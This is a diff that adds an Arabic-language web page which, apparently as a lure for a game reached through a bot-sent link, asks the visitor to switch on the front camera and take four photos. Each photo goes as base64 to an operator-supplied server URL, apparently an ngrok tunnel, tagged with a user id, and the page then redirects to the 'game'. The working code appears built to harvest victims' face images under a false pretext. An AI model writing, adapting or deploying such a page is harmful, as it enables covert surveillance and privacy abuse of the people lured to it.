@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التقاط الصور</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f8ff; color: #333; }
+        .container { background-color: #fff; padding: 25px; border-radius: 10px; box-shadow: 0 5px 15px rgba(0,0,0,0.2); text-align: center; max-width: 450px; width: 90%; }
+        h1 { color: #007bff; margin-bottom: 20px; }
+        video { width: 100%; max-width: 400px; height: auto; border: 2px solid #ccc; border-radius: 8px; background-color: #000; margin-bottom: 20px; transform: scaleX(-1); /* لقلب الصورة أفقيا للكاميرا الأمامية */ }
+        button { background-color: #28a745; color: white; padding: 12px 25px; border: none; border-radius: 5px; cursor: pointer; font-size: 1.1em; transition: background-color 0.3s ease; margin-top: 15px; }
+        button:hover { background-color: #218838; }
+        #status { margin-top: 20px; font-weight: bold; color: #555; }
+        #photoCount { font-size: 1.2em; color: #007bff; margin-bottom: 15px; }
+        #error-message { color: red; font-weight: bold; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>التقاط الصور</h1>
+        <p>الرجاء الضغط على "تفعيل الكاميرا" لمنح الإذن، ثم اضغط على "التقاط صورة" 4 مرات.</p>
+        <video id="videoElement" autoplay playsinline></video>
+        <canvas id="canvasElement" style="display:none;"></canvas>
+        <button id="cameraButton" onclick="startCamera()">تفعيل الكاميرا</button>
+        <button id="captureButton" style="display:none;" onclick="captureAndSendPhoto()">التقاط صورة (0/4)</button>
+        <p id="status"></p>
+        <p id="error-message"></p>
+    </div>
+
+    <script>
+        const video = document.getElementById('videoElement');
+        const canvas = document.getElementById('canvasElement');
+        const captureButton = document.getElementById('captureButton');
+        const cameraButton = document.getElementById('cameraButton');
+        const statusDiv = document.getElementById('status');
+        const errorMessageDiv = document.getElementById('error-message');
+        const context = canvas.getContext('2d');
+        let stream;
+        let photoCount = 0;
+        const maxPhotos = 4;
+        let userId = 'unknown'; // لمعرف المستخدم من الرابط
+        let serverUploadUrl = ''; // سيتم تعيينه ديناميكياً
+
+        // وظيفة لاستخراج معلمات URL
+        function getQueryParams() {
+            const params = {};
+            window.location.search.substring(1).split('&').forEach(param => {
+                const parts = param.split('=');
+                params[decodeURIComponent(parts[0])] = decodeURIComponent(parts[1] || '');
+            });
+            return params;
+        }
+
+        window.onload = function() {
+            const params = getQueryParams();
+            userId = params['user_id'] || 'unknown';
+            serverUploadUrl = params['server_url'] || ''; // جلب رابط الخادم من الـ URL
+            console.log('User ID:', userId);
+            console.log('Server Upload URL:', serverUploadUrl);
+
+            if (!serverUploadUrl) {
+                errorMessageDiv.textContent = 'خطأ: لم يتم توفير رابط الخادم. يرجى التأكد من أن البوت يرسل الرابط بشكل صحيح.';
+                cameraButton.disabled = true;
+            }
+        };
+
+        async function startCamera() {
+            errorMessageDiv.textContent = ''; // مسح أي رسائل خطأ سابقة
+            statusDiv.textContent = 'جارٍ طلب إذن الكاميرا...';
+            try {
+                // طلب الوصول إلى الكاميرا الأمامية
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                video.srcObject = stream;
+                video.style.display = 'block'; // إظهار الفيديو
+                cameraButton.style.display = 'none'; // إخفاء زر تفعيل الكاميرا
+                captureButton.style.display = 'block'; // إظهار زر الالتقاط
+                statusDiv.textContent = 'الكاميرا جاهزة. اضغط على "التقاط صورة".';
+            } catch (err) {
+                console.error("Error accessing camera: ", err);
+                errorMessageDiv.textContent = `فشل الوصول إلى الكاميرا: ${err.name}. يرجى التأكد من منح الإذن.`;
+                statusDiv.textContent = '';
+            }
+        }
+
+        async function captureAndSendPhoto() {
+            if (!stream) {
+                errorMessageDiv.textContent = 'الكاميرا ليست نشطة. يرجى تفعيل الكاميرا أولاً.';
+                return;
+            }
+
+            if (photoCount >= maxPhotos) {
+                statusDiv.textContent = 'تم التقاط الحد الأقصى من الصور. جارٍ التوجيه إلى اللعبة...';
+                redirectToGame();
+                return;
+            }
+
+            statusDiv.textContent = 'جارٍ التقاط الصورة...';
+            captureButton.disabled = true; // تعطيل الزر مؤقتاً
+
+            // ضبط أبعاد Canvas لتتناسب مع الفيديو
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // تحويل الصورة إلى Data URL (Base64)
+            const imageDataUrl = canvas.toDataURL('image/png');
+
+            // إرسال الصورة إلى الخادم الوسيط
+            try {
+                const response = await fetch(serverUploadUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        image: imageDataUrl,
+                        user_id: userId,
+                        photo_index: photoCount + 1 // لتحديد رقم الصورة
+                    }),
+                });
+
+                const result = await response.json();
+                if (result.status === 'success') {
+                    photoCount++;
+                    captureButton.textContent = `التقاط صورة (${photoCount}/${maxPhotos})`;
+                    statusDiv.textContent = `تم التقاط الصورة رقم ${photoCount} وإرسالها بنجاح!`;
+
+                    if (photoCount >= maxPhotos) {
+                        captureButton.textContent = 'الدخول إلى اللعبة';
+                        statusDiv.textContent = 'تم التقاط جميع الصور. اضغط للدخول إلى اللعبة.';
+                        captureButton.onclick = redirectToGame; // تغيير وظيفة الزر
+                    }
+                } else {
+                    errorMessageDiv.textContent = `خطأ في إرسال الصورة: ${result.message}`;
+                    statusDiv.textContent = '';
+                }
+            } catch (error) {
+                console.error('Error sending photo to server:', error);
+                errorMessageDiv.textContent = `فشل الاتصال بالخادم: ${error.message}. تأكد أن الخادم يعمل وngrok نشط.`;
+                statusDiv.textContent = '';
+            } finally {
+                captureButton.disabled = false; // إعادة تفعيل الزر
+            }
+        }
+
+        function redirectToGame() {
+            // إيقاف بث الكاميرا قبل التوجيه
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+            // التوجيه إلى صفحة اللعبة مع تمرير معرف المستخدم
+            window.location.href = `game.html?user_id=${userId}`;
+        }
+    </script>
+</body>
+</html>
